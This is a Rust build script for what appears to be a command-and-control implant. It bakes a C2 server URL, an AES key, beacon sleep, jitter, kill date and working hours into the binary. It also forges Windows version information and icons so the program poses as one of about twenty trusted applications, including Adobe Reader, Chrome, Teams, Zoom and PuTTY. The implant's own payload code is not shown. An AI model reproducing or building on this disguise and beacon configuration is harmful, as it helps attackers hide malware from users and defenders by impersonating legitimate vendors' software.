use std::env;

fn main() {
    // Embed compile-time configuration via environment variables
    // These can be overridden at build time:
    //   SG_SERVER_URL, SG_AES_KEY, SG_SLEEP, SG_JITTER, SG_KILLDATE, SG_WORK_HOURS
    println!("cargo:rerun-if-env-changed=SG_SERVER_URL");
    println!("cargo:rerun-if-env-changed=SG_AES_KEY");
    println!("cargo:rerun-if-env-changed=SG_SLEEP");
    println!("cargo:rerun-if-env-changed=SG_JITTER");
    println!("cargo:rerun-if-env-changed=SG_KILLDATE");
    println!("cargo:rerun-if-env-changed=SG_WORK_HOURS");
    println!("cargo:rerun-if-env-changed=SG_DISGUISE");
    println!("cargo:rerun-if-env-changed=SG_ICON_PATH");

    let server_url = env::var("SG_SERVER_URL").unwrap_or_else(|_| "https://127.0.0.1:8443".to_string());
    let aes_key = env::var("SG_AES_KEY").unwrap_or_else(|_| "0000000000000000000000000000000000000000000000000000000000000000".to_string());
    let sleep = env::var("SG_SLEEP").unwrap_or_else(|_| "5".to_string());
    let jitter = env::var("SG_JITTER").unwrap_or_else(|_| "20".to_string());
    let killdate = env::var("SG_KILLDATE").unwrap_or_else(|_| "0".to_string());
    let work_hours = env::var("SG_WORK_HOURS").unwrap_or_else(|_| "00:00-23:59".to_string());

    println!("cargo:rustc-env=SG_SERVER_URL={}", server_url);
    println!("cargo:rustc-env=SG_AES_KEY={}", aes_key);
    println!("cargo:rustc-env=SG_SLEEP={}", sleep);
    println!("cargo:rustc-env=SG_JITTER={}", jitter);
    println!("cargo:rustc-env=SG_KILLDATE={}", killdate);
    println!("cargo:rustc-env=SG_WORK_HOURS={}", work_hours);

    // App disguise: embed Windows version info and icon at compile time
    #[cfg(target_os = "windows")]
    {
        let disguise = env::var("SG_DISGUISE").unwrap_or_else(|_| "none".to_string());
        if disguise != "none" {
            let mut res = winresource::WindowsResource::new();

            match disguise.as_str() {
                "adobe_acrobat" => {
                    res.set("ProductName", "Adobe Acrobat Reader DC");
                    res.set("CompanyName", "Adobe Inc.");
                    res.set("FileDescription", "Adobe Acrobat Reader DC");
                    res.set("OriginalFilename", "AcroRd32.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 1984-2024 Adobe Inc.");
                    res.set("FileVersion", "23.8.20555.0");
                    res.set("ProductVersion", "23.8.20555.0");
                },
                "chrome" => {
                    res.set("ProductName", "Google Chrome");
                    res.set("CompanyName", "Google LLC");
                    res.set("FileDescription", "Google Chrome");
                    res.set("OriginalFilename", "chrome.exe");
                    res.set("LegalCopyright", "Copyright 2024 Google LLC. All rights reserved.");
                    res.set("FileVersion", "120.0.6099.130");
                    res.set("ProductVersion", "120.0.6099.130");
                },
                "edge" => {
                    res.set("ProductName", "Microsoft Edge");
                    res.set("CompanyName", "Microsoft Corporation");
                    res.set("FileDescription", "Microsoft Edge");
                    res.set("OriginalFilename", "msedge.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} Microsoft Corporation. All rights reserved.");
                    res.set("FileVersion", "120.0.2210.91");
                    res.set("ProductVersion", "120.0.2210.91");
                },
                "teams" => {
                    res.set("ProductName", "Microsoft Teams");
                    res.set("CompanyName", "Microsoft Corporation");
                    res.set("FileDescription", "Microsoft Teams");
                    res.set("OriginalFilename", "Teams.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} Microsoft Corporation. All rights reserved.");
                    res.set("FileVersion", "24.1.100.2653");
                    res.set("ProductVersion", "24.1.100.2653");
                },
                "zoom" => {
                    res.set("ProductName", "Zoom Meetings");
                    res.set("CompanyName", "Zoom Video Communications, Inc.");
                    res.set("FileDescription", "Zoom Meetings");
                    res.set("OriginalFilename", "Zoom.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 2024 Zoom Video Communications, Inc.");
                    res.set("FileVersion", "5.17.5.34827");
                    res.set("ProductVersion", "5.17.5.34827");
                },
                "slack" => {
                    res.set("ProductName", "Slack");
                    res.set("CompanyName", "Slack Technologies, LLC");
                    res.set("FileDescription", "Slack - Desktop Client");
                    res.set("OriginalFilename", "slack.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 2024 Slack Technologies, LLC");
                    res.set("FileVersion", "4.36.140.0");
                    res.set("ProductVersion", "4.36.140.0");
                },
                "discord" => {
                    res.set("ProductName", "Discord");
                    res.set("CompanyName", "Discord Inc.");
                    res.set("FileDescription", "Discord - Chat for Communities and Friends");
                    res.set("OriginalFilename", "Discord.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 2024 Discord Inc.");
                    res.set("FileVersion", "1.0.9035.0");
                    res.set("ProductVersion", "1.0.9035.0");
                },
                "spotify" => {
                    res.set("ProductName", "Spotify");
                    res.set("CompanyName", "Spotify AB");
                    res.set("FileDescription", "Spotify Music Player");
                    res.set("OriginalFilename", "Spotify.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 2024 Spotify AB");
                    res.set("FileVersion", "1.2.26.1187");
                    res.set("ProductVersion", "1.2.26.1187");
                },
                "steam" => {
                    res.set("ProductName", "Steam");
                    res.set("CompanyName", "Valve Corporation");
                    res.set("FileDescription", "Steam Client Bootstrapper");
                    res.set("OriginalFilename", "steam.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 1996-2024 Valve Corporation. All rights reserved.");
                    res.set("FileVersion", "2.10.91.91");
                    res.set("ProductVersion", "2.10.91.91");
                },
                "vlc" => {
                    res.set("ProductName", "VLC media player");
                    res.set("CompanyName", "VideoLAN");
                    res.set("FileDescription", "VLC media player");
                    res.set("OriginalFilename", "vlc.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 1996-2024 VideoLAN and VLC Authors");
                    res.set("FileVersion", "3.0.20.0");
                    res.set("ProductVersion", "3.0.20.0");
                },
                "sevenzip" => {
                    res.set("ProductName", "7-Zip File Manager");
                    res.set("CompanyName", "Igor Pavlov");
                    res.set("FileDescription", "7-Zip File Manager");
                    res.set("OriginalFilename", "7zFM.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 1999-2024 Igor Pavlov");
                    res.set("FileVersion", "23.1.0.0");
                    res.set("ProductVersion", "23.1.0.0");
                },
                "notepadpp" => {
                    res.set("ProductName", "Notepad++");
                    res.set("CompanyName", "Don Ho");
                    res.set("FileDescription", "Notepad++ : a free (GNU) source code editor");
                    res.set("OriginalFilename", "notepad++.exe");
                    res.set("LegalCopyright", "Copyleft 2024 by Don HO");
                    res.set("FileVersion", "8.6.2.0");
                    res.set("ProductVersion", "8.6.2.0");
                },
                "winrar" => {
                    res.set("ProductName", "WinRAR archiver");
                    res.set("CompanyName", "Alexander L. Roshal");
                    res.set("FileDescription", "WinRAR archiver");
                    res.set("OriginalFilename", "WinRAR.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} Alexander L. Roshal 1993-2024");
                    res.set("FileVersion", "7.0.0.0");
                    res.set("ProductVersion", "7.0.0.0");
                },
                "filezilla" => {
                    res.set("ProductName", "FileZilla FTP Client");
                    res.set("CompanyName", "FileZilla Project");
                    res.set("FileDescription", "FileZilla FTP Client");
                    res.set("OriginalFilename", "filezilla.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 2004-2024 Tim Kosse");
                    res.set("FileVersion", "3.66.5.0");
                    res.set("ProductVersion", "3.66.5.0");
                },
                "putty" => {
                    res.set("ProductName", "PuTTY suite");
                    res.set("CompanyName", "Simon Tatham");
                    res.set("FileDescription", "SSH, Telnet, Rlogin, and SUPDUP client");
                    res.set("OriginalFilename", "putty.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 1997-2024 Simon Tatham. All rights reserved.");
                    res.set("FileVersion", "0.80.0.0");
                    res.set("ProductVersion", "0.80.0.0");
                },
                "onedrive" => {
                    res.set("ProductName", "Microsoft OneDrive");
                    res.set("CompanyName", "Microsoft Corporation");
                    res.set("FileDescription", "Microsoft OneDrive");
                    res.set("OriginalFilename", "OneDrive.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} Microsoft Corporation. All rights reserved.");
                    res.set("FileVersion", "24.1.100.0");
                    res.set("ProductVersion", "24.1.100.0");
                },
                "dropbox" => {
                    res.set("ProductName", "Dropbox");
                    res.set("CompanyName", "Dropbox, Inc.");
                    res.set("FileDescription", "Dropbox");
                    res.set("OriginalFilename", "Dropbox.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 2024 Dropbox, Inc.");
                    res.set("FileVersion", "192.4.7652.0");
                    res.set("ProductVersion", "192.4.7652.0");
                },
                "nodejs" => {
                    res.set("ProductName", "Node.js");
                    res.set("CompanyName", "Node.js");
                    res.set("FileDescription", "Node.js: Server-side JavaScript");
                    res.set("OriginalFilename", "node.exe");
                    res.set("LegalCopyright", "Copyright Node.js contributors. MIT License.");
                    res.set("FileVersion", "21.5.0.0");
                    res.set("ProductVersion", "21.5.0.0");
                },
                "python" => {
                    res.set("ProductName", "Python");
                    res.set("CompanyName", "Python Software Foundation");
                    res.set("FileDescription", "Python");
                    res.set("OriginalFilename", "python.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} 2001-2024 Python Software Foundation.");
                    res.set("FileVersion", "3.12.1.0");
                    res.set("ProductVersion", "3.12.1.0");
                },
                "vscode" => {
                    res.set("ProductName", "Visual Studio Code");
                    res.set("CompanyName", "Microsoft Corporation");
                    res.set("FileDescription", "Visual Studio Code");
                    res.set("OriginalFilename", "Code.exe");
                    res.set("LegalCopyright", "Copyright \u{00A9} Microsoft Corporation. All rights reserved.");
                    res.set("FileVersion", "1.85.1.0");
                    res.set("ProductVersion", "1.85.1.0");
                },
                _ => {}
            }

            // Set icon if SG_ICON_PATH is provided
            if let Ok(icon_path) = env::var("SG_ICON_PATH") {
                if std::path::Path::new(&icon_path).exists() {
                    res.set_icon(&icon_path);
                }
            }

            res.compile().unwrap_or_else(|e| {
                eprintln!("winresource compile warning: {}", e);
            });
        }
    }
}
